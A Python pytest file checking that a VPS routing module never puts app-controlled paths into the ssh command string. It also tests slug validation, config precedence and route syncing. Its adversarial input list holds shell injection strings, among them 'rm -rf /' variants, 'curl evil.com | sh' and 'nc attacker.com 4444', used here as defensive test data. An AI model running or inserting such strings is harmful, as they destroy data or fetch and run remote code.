"""Proves vps_routing.py closes the injection class the old
simple-deploy/register_vps_route.py had: that script f-string-interpolated
an app-controlled `path` value directly into a REMOTE SHELL COMMAND STRING
before handing it to `ssh` - a real command-injection vulnerability if that
value ever contained shell metacharacters (2026-07-30 security audit
finding: "SSH command injection in the VPS routing plugin").

This module's approach: the remote script text (`_REMOTE_SCRIPT`) is a
FIXED constant on every call - dynamic values (method, path, body) travel
over subprocess stdin, never string-interpolated into any command. This
test asserts that structurally: for a battery of adversarial path/app-name
values, the actual `subprocess.run` argv passed to `ssh` never contains the
adversarial substring anywhere (it can only ever appear inside the stdin
payload, never the command).

Also covers: config loading precedence (env vars over the optional file,
either source missing required fields disables the feature entirely -
never raises), and that `_slug_safe` rejects genuinely dangerous app names
even though the schema's own DNS-1123 validator should already exclude them
- defense-in-depth, matching this project's own stated philosophy.
"""

from __future__ import annotations

from unittest.mock import patch

import pytest

from cube_manifest import vps_routing
from cube_manifest.schema.models import AppConfig, ServiceType, VpsRoute

ADVERSARIAL_VALUES = [
    "'; rm -rf / #",
    "$(rm -rf /)",
    "`rm -rf /`",
    "foo && curl evil.com | sh",
    "foo\nrm -rf /",
    'foo" ; rm -rf / ; echo "',
    "foo | nc attacker.com 4444",
]


def _make_config(**overrides) -> vps_routing.VpsRoutingConfig:
    base = {
        "ssh_host": "129.121.47.67",
        "ssh_port": 22022,
        "ssh_user": "root",
        "caddy_container": "advogadosx-caddy-1",
        "default_host": "cybertechnology.sh",
        "home_tailscale_ip": "100.127.98.1",
        "identity_file": "/home/test/.ssh/id_ed25519",
        "password": None,
    }
    base.update(overrides)
    return vps_routing.VpsRoutingConfig(**base)


class TestNoInjectionInCommandString:
    @pytest.mark.parametrize("payload", ADVERSARIAL_VALUES)
    def test_adversarial_path_never_appears_in_argv(self, payload):
        """The dynamic path value (base64'd, then only consumed via stdin
        after decode) must never appear literally in the ssh argv - only in
        the stdin payload we ourselves construct and inspect."""
        config = _make_config()
        captured = {}

        def fake_run(argv, input, **kwargs):
            captured["argv"] = argv
            captured["stdin"] = input
            result = type("R", (), {})()
            result.returncode = 0
            result.stdout = "HTTP:200"
            result.stderr = ""
            return result

        with patch("subprocess.run", side_effect=fake_run):
            vps_routing._run_remote(config, "PUT", f"/id/home-route-x{payload}", {"k": payload})

        full_command_string = " ".join(captured["argv"])
        assert payload not in full_command_string, (
            f"adversarial payload leaked into the ssh command argv itself: {full_command_string!r}"
        )
        # The remote script text portion specifically must be byte-identical
        # to the fixed constant every time, regardless of the payload.
        assert vps_routing._REMOTE_SCRIPT in full_command_string

    def test_remote_script_is_a_fixed_constant_never_built_per_call(self):
        """Directly asserts _run_remote never builds a NEW script string
        per call - the same fixed _REMOTE_SCRIPT constant must be embedded
        verbatim in the docker exec command every time."""
        config = _make_config()
        seen_commands = set()

        def fake_run(argv, input, **kwargs):
            seen_commands.add(argv[-1])
            result = type("R", (), {})()
            result.returncode = 0
            result.stdout = "HTTP:200"
            result.stderr = ""
            return result

        with patch("subprocess.run", side_effect=fake_run):
            vps_routing._run_remote(config, "GET", "/id/a", None)
            vps_routing._run_remote(config, "PUT", "/id/completely-different-path", {"x": 1})
            vps_routing._run_remote(config, "DELETE", "/id/yet-another", None)

        # Every call's remote command is IDENTICAL (only stdin differs).
        assert len(seen_commands) == 1


class TestSlugSafety:
    @pytest.mark.parametrize("payload", ADVERSARIAL_VALUES)
    def test_route_id_rejects_adversarial_app_names(self, payload):
        with pytest.raises(vps_routing.VpsRoutingError):
            vps_routing._route_id(payload)

    def test_route_id_accepts_a_normal_app_name(self):
        assert vps_routing._route_id("portfolio") == "home-route-portfolio"


class TestConfigLoading:
    def test_no_config_at_all_returns_none(self, monkeypatch, tmp_path):
        for key in list(__import__("os").environ):
            if key.startswith("CUBE_MANIFEST_VPS_"):
                monkeypatch.delenv(key, raising=False)
        monkeypatch.setattr(vps_routing, "_config_file_path", lambda: tmp_path / "nonexistent.yaml")
        assert vps_routing.VpsRoutingConfig.load() is None

    def test_missing_credential_returns_none_even_with_host_and_user(self, monkeypatch, tmp_path):
        monkeypatch.setenv("CUBE_MANIFEST_VPS_SSH_HOST", "1.2.3.4")
        monkeypatch.setenv("CUBE_MANIFEST_VPS_SSH_USER", "root")
        monkeypatch.delenv("CUBE_MANIFEST_VPS_SSH_IDENTITY_FILE", raising=False)
        monkeypatch.delenv("CUBE_MANIFEST_VPS_SSH_PASSWORD", raising=False)
        monkeypatch.setattr(vps_routing, "_config_file_path", lambda: tmp_path / "nonexistent.yaml")
        assert vps_routing.VpsRoutingConfig.load() is None

    def test_env_vars_fully_configured_loads_successfully(self, monkeypatch, tmp_path):
        monkeypatch.setenv("CUBE_MANIFEST_VPS_SSH_HOST", "129.121.47.67")
        monkeypatch.setenv("CUBE_MANIFEST_VPS_SSH_PORT", "22022")
        monkeypatch.setenv("CUBE_MANIFEST_VPS_SSH_USER", "root")
        monkeypatch.setenv("CUBE_MANIFEST_VPS_SSH_IDENTITY_FILE", "/home/test/.ssh/id_ed25519")
        monkeypatch.setattr(vps_routing, "_config_file_path", lambda: tmp_path / "nonexistent.yaml")
        config = vps_routing.VpsRoutingConfig.load()
        assert config is not None
        assert config.ssh_host == "129.121.47.67"
        assert config.ssh_port == 22022

    def test_env_vars_take_precedence_over_file(self, monkeypatch, tmp_path):
        config_file = tmp_path / "vps-routing.yaml"
        config_file.write_text("ssh_host: file-host\nssh_user: file-user\nssh_identity_file: /file/key\n")
        monkeypatch.setattr(vps_routing, "_config_file_path", lambda: config_file)
        monkeypatch.setenv("CUBE_MANIFEST_VPS_SSH_HOST", "env-host")
        monkeypatch.setenv("CUBE_MANIFEST_VPS_SSH_USER", "env-user")
        monkeypatch.setenv("CUBE_MANIFEST_VPS_SSH_IDENTITY_FILE", "/env/key")
        config = vps_routing.VpsRoutingConfig.load()
        assert config.ssh_host == "env-host"

    def test_file_only_no_env_vars_still_loads(self, monkeypatch, tmp_path):
        config_file = tmp_path / "vps-routing.yaml"
        config_file.write_text(
            "ssh_host: 129.121.47.67\nssh_user: root\nssh_identity_file: /home/test/.ssh/id_ed25519\n"
        )
        monkeypatch.setattr(vps_routing, "_config_file_path", lambda: config_file)
        for key in list(__import__("os").environ):
            if key.startswith("CUBE_MANIFEST_VPS_"):
                monkeypatch.delenv(key, raising=False)
        config = vps_routing.VpsRoutingConfig.load()
        assert config is not None
        assert config.ssh_host == "129.121.47.67"


class TestSyncRoute:
    def test_app_without_vps_route_is_a_noop(self):
        app = AppConfig(name="no-vps-route-app", enabled=True)
        ok, message = vps_routing.sync_route(app, _make_config())
        assert ok is True
        assert "nothing to sync" in message

    def test_app_with_vps_route_but_no_node_port_fails_gracefully(self):
        app = AppConfig(
            name="portfolio",
            enabled=True,
            vps_route=VpsRoute(path_prefix="/apps/portfolio"),
        )
        ok, message = vps_routing.sync_route(app, _make_config())
        assert ok is False
        assert "node_port" in message

    def test_insert_path_when_route_does_not_exist(self):
        app = AppConfig(
            name="portfolio",
            enabled=True,
            service_type=ServiceType.node_port,
            node_port=30883,
            vps_route=VpsRoute(path_prefix="/apps/portfolio"),
        )
        calls = []

        def fake_run_remote(config, method, path, body):
            calls.append((method, path, body))
            if method == "GET":
                return False, "HTTP:404"
            return True, "HTTP:200"

        with patch.object(vps_routing, "_run_remote", side_effect=fake_run_remote):
            ok, message = vps_routing.sync_route(app, _make_config())

        assert ok is True
        assert "Inserted" in message
        assert calls[0][0] == "GET"
        assert calls[1][0] == "PUT"
        assert calls[1][2]["match"][0]["host"] == ["cybertechnology.sh"]

    def test_patch_path_when_route_already_exists(self):
        app = AppConfig(
            name="portfolio",
            enabled=True,
            service_type=ServiceType.node_port,
            node_port=30883,
            vps_route=VpsRoute(path_prefix="/apps/portfolio", host="cybertechnology.sh"),
        )
        calls = []

        def fake_run_remote(config, method, path, body):
            calls.append((method, path, body))
            return True, "HTTP:200"

        with patch.object(vps_routing, "_run_remote", side_effect=fake_run_remote):
            ok, message = vps_routing.sync_route(app, _make_config())

        assert ok is True
        assert "Updated" in message
        assert calls[1][0] == "PATCH"
